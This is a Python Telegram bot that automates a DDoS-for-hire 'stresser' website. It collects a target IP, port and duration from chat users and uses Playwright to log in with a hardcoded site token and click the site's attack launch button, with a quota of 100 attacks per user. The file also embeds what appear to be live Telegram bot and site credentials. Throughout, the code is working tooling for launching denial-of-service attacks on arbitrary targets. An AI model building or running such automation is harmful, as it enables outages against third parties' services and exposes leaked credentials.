import os
import json
import logging
import threading
import time
import asyncio
import glob
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from playwright.async_api import async_playwright

# ==================== CONFIG ====================
logging.basicConfig(format='%(astime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8521144614:AAEMAgYMWzljYmC_Cjw-258KEO-G92G2B3s"
WEBSITE_URL = "https://satellitestress.st/attack"
LOGIN_URL = "https://satellitestress.st/login"
WEBSITE_TOKEN = "622de40ac2335a06b834fad06a24c42dcfdc7423b93d35a5add017c08c10db37"

# ==================== ATTACK TRACKING ====================
attack_file = "attacks.json"

def load_attacks():
    try:
        with open(attack_file, 'r') as f:
            return json.load(f)
    except:
        return {"current": None, "user_counts": {}}

def save_attacks(data):
    with open(attack_file, 'w') as f:
        json.dump(data, f, indent=2)

attacks = load_attacks()

# ==================== PLAYWRIGHT SETUP ====================
def get_playwright_chromium_path():
    """Find Playwright's installed Chromium path"""
    cache_dir = os.path.expanduser("~/.cache/ms-playwright")
    chromium_folders = glob.glob(f"{cache_dir}/chromium-*")
    
    if chromium_folders:
        # Linux
        linux_path = os.path.join(chromium_folders[0], "chrome-linux", "chrome")
        if os.path.exists(linux_path):
            return linux_path
        
        # Windows
        win_path = os.path.join(chromium_folders[0], "chrome-win", "chrome.exe")
        if os.path.exists(win_path):
            return win_path
    
    return None

# ==================== PLAYWRIGHT ATTACK FUNCTION ====================
async def launch_attack_playwright(ip, port, duration):
    try:
        async with async_playwright() as p:
            # Get Chromium path
            chromium_path = get_playwright_chromium_path()
            
            # Launch browser
            if chromium_path:
                browser = await p.chromium.launch(
                    executablePath=chromium_path,
                    headless=True
                )
            else:
                browser = await p.chromium.launch(headless=True)
            
            context = await browser.new_context(
                viewport={'width': 1920, 'height': 1080}
            )
            page = await context.new_page()
            
            # === LOGIN ===
            print("🔑 Logging in...")
            await page.goto(LOGIN_URL, wait_until='networkidle')
            
            # Wait for token field
            await page.wait_for_selector('input[name="token"]', timeout=10000)
            await page.fill('input[name="token"]', WEBSITE_TOKEN)
            
            # Check for CAPTCHA
            captcha = await page.query_selector('input[name="captcha"]')
            if captcha:
                return False, "CAPTCHA_REQUIRED"
            
            # Click login and wait
            await page.click('button:has-text("Login")')
            await page.wait_for_timeout(3000)
            
            # === ATTACK PAGE ===
            print("🎯 Navigating to attack page...")
            await page.goto(WEBSITE_URL, wait_until='networkidle')
            await page.wait_for_timeout(3000)
            
            # === DEBUG: Save screenshot ===
            await page.screenshot(path='attack_page.png')
            print("📸 Screenshot saved: attack_page.png")
            
            # === FIND INPUT FIELDS ===
            # Wait for inputs to be present
            await page.wait_for_selector('input[type="text"]', timeout=10000)
            inputs = await page.query_selector_all('input[type="text"]')
            print(f"🔍 Found {len(inputs)} text input fields")
            
            # Filter out hidden inputs
            visible_inputs = []
            for inp in inputs:
                is_hidden = await inp.get_attribute('type') == 'hidden'
                if not is_hidden:
                    visible_inputs.append(inp)
            
            print(f"👁️ Visible inputs: {len(visible_inputs)}")
            
            if len(visible_inputs) >= 3:
                # Clear and fill IP (first visible input)
                await visible_inputs[0].fill('')
                await visible_inputs[0].fill(ip)
                print(f"✅ IP entered: {ip}")
                
                # Clear and fill Port (second visible input)
                await visible_inputs[1].fill('')
                await visible_inputs[1].fill(str(port))
                print(f"✅ Port entered: {port}")
                
                # Clear and fill Duration (third visible input)
                await visible_inputs[2].fill('')
                await visible_inputs[2].fill(str(duration))
                print(f"✅ Duration entered: {duration}")
            else:
                return False, f"❌ Sirf {len(visible_inputs)} visible inputs mile"
            
            # === FIND LAUNCH BUTTON ===
            await page.wait_for_timeout(1000)
            
            # Try multiple button selectors
            button_selectors = [
                'button:has-text("Launch")',
                'button:has-text("Attack")',
                'button[type="submit"]',
                'button.bg-cyan-500',
                'button.w-full'
            ]
            
            launch_btn = None
            for selector in button_selectors:
                try:
                    btn = await page.query_selector(selector)
                    if btn:
                        launch_btn = btn
                        print(f"✅ Button found with: {selector}")
                        break
                except:
                    continue
            
            if not launch_btn:
                # Try to find any button
                all_buttons = await page.query_selector_all('button')
                print(f"🔍 Found {len(all_buttons)} buttons total")
                
                if all_buttons:
                    # Usually the last button is the launch button
                    launch_btn = all_buttons[-1]
                    print("✅ Using last button as launch button")
                else:
                    return False, "❌ Launch button nahi mila"
            
            # Click launch button
            await launch_btn.click()
            print("✅ Launch button clicked")
            
            # Wait for attack to register
            await page.wait_for_timeout(5000)
            
            # === VERIFY ATTACK STARTED ===
            # Check for success indicators
            page_content = await page.content()
            if "attack started" in page_content.lower() or "launching" in page_content.lower():
                print("✅ Attack confirmed started")
            else:
                print("⚠️ Could not verify attack start, but continuing...")
            
            # Take final screenshot
            await page.screenshot(path='attack_result.png')
            print("📸 Final screenshot: attack_result.png")
            
            await browser.close()
            return True, "SUCCESS"
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False, str(e)

# ==================== TELEGRAM HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("🎯 Launch Attack")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "🤖 **ATTACK BOT**\n\n"
        "Click below to start attack:",
        reply_markup=reply_markup
    )

async def attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if attacks.get("current") is not None:
        await update.message.reply_text("⚠️ Attack already running. Wait!")
        return
    
    context.user_data["step"] = "ip"
    keyboard = [[KeyboardButton("❌ Cancel")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "🎯 **STEP 1/3**\n"
        "Send IP:\n"
        "Example: `1.1.1.1`",
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    
    if text == "❌ Cancel":
        context.user_data.clear()
        await start(update, context)
        return
    
    if text == "🎯 Launch Attack":
        await attack_start(update, context)
        return
    
    if "step" in context.user_data:
        step = context.user_data["step"]
        
        if step == "ip":
            context.user_data["ip"] = text
            context.user_data["step"] = "port"
            await update.message.reply_text(
                "✅ IP saved\n\n"
                "**STEP 2/3**\n"
                "Send Port:\n"
                "Example: `80`"
            )
            
        elif step == "port":
            try:
                port = int(text)
                context.user_data["port"] = port
                context.user_data["step"] = "duration"
                
                keyboard = [
                    [InlineKeyboardButton("30s", callback_data="dur_30"),
                     InlineKeyboardButton("60s", callback_data="dur_60"),
                     InlineKeyboardButton("120s", callback_data="dur_120")],
                    [InlineKeyboardButton("180s", callback_data="dur_180"),
                     InlineKeyboardButton("240s", callback_data="dur_240"),
                     InlineKeyboardButton("300s", callback_data="dur_300")]
                ]
                
                await update.message.reply_text(
                    f"✅ IP: `{context.user_data['ip']}`\n"
                    f"✅ Port: `{port}`\n\n"
                    "**STEP 3/3**\n"
                    "Select duration:",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            except:
                await update.message.reply_text("❌ Invalid port. Send a number:")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("dur_"):
        duration = int(query.data.split("_")[1])
        
        if "ip" not in context.user_data or "port" not in context.user_data:
            await query.message.edit_text("❌ Session expired. Start again.")
            return
        
        ip = context.user_data["ip"]
        port = context.user_data["port"]
        user_id = query.from_user.id
        context.user_data.clear()
        
        # Check if attack already running
        if attacks.get("current") is not None:
            await query.message.edit_text("⚠️ Attack already running. Wait!")
            return
        
        attacks["current"] = {
            "ip": ip,
            "port": port,
            "duration": duration,
            "user_id": user_id,
            "start_time": time.time()
        }
        save_attacks(attacks)
        
        await query.message.edit_text(
            f"🔄 **LAUNCHING ATTACK...**\n\n"
            f"Target: `{ip}:{port}`\n"
            f"Duration: {duration}s\n\n"
            f"This may take a moment..."
        )
        
        # Run Playwright attack
        loop = asyncio.get_event_loop()
        
        def attack_thread():
            try:
                # Run async function in thread
                future = asyncio.run_coroutine_threadsafe(
                    launch_attack_playwright(ip, port, duration),
                    loop
                )
                success, result = future.result(timeout=60)
                
                attacks["current"] = None
                
                # Update attack count
                counts = attacks.get("user_counts", {})
                user_key = str(user_id)
                counts[user_key] = counts.get(user_key, 0) + 1
                attacks["user_counts"] = counts
                save_attacks(attacks)
                
                remaining = 100 - counts.get(user_key, 0)
                
                async def send_result():
                    if success:
                        await context.bot.send_message(
                            chat_id=query.message.chat_id,
                            text=f"✅ **ATTACK COMPLETED!**\n\n"
                                 f"Target: `{ip}:{port}`\n"
                                 f"Duration: {duration}s\n"
                                 f"Status: ✅ Successful\n"
                                 f"Attacks Left: {remaining}/100\n\n"
                                 f"Check website to confirm attack."
                        )
                    else:
                        await context.bot.send_message(
                            chat_id=query.message.chat_id,
                            text=f"❌ **FAILED**\n\n"
                                 f"Target: `{ip}:{port}`\n"
                                 f"Error: {result}\n\n"
                                 f"Try again or contact admin."
                        )
                
                asyncio.run_coroutine_threadsafe(send_result(), loop)
                
            except Exception as e:
                attacks["current"] = None
                save_attacks(attacks)
                
                async def send_error():
                    await context.bot.send_message(
                        chat_id=query.message.chat_id,
                        text=f"❌ **ERROR**\n\n{str(e)}"
                    )
                
                asyncio.run_coroutine_threadsafe(send_error(), loop)
        
        thread = threading.Thread(target=attack_thread)
        thread.daemon = True
        thread.start()

# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("="*50)
    print("🔥 PLAYWRIGHT ATTACK BOT STARTED")
    print("="*50)
    print(f"👤 Everyone gets 100 attacks")
    print(f"📁 Check attack_page.png for debugging")
    print("="*50)
    
    app.run_polling()

if __name__ == "__main__":
    main()
